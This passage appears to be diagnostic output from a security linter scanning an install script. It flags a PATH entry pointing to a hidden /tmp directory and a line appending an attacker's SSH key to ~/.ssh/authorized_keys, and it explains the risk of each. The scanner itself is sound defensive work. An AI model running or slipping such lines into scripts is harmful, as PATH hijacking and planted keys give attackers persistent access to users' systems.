  = help: Publishers can ship a SHA256SUMS file next to releases and compare against it.

🚩 [path_suspicious]: PATH includes a temporary or world-writable directory: `/tmp/.cache`
 --> <stdin>:4:8
  |
4 | export PATH="/tmp/.cache:$PATH"
  |        ^^^^^^^^^^^^^^^^^^^^^^^^ path
  |
  = note: Any file dropped there shadows real commands for the rest of the script (and your shell, if exported to rc files).

🚩 [sensitive_write]: writes to sensitive file `~/.ssh/authorized_keys` via redirect
 --> <stdin>:5:1
  |
5 | echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ sensitive
  |
  = note: Changes persist beyond the install and affect every future shell, login or privilege check.
  = help: Prefer installers that print the lines to add instead of editing files for you.

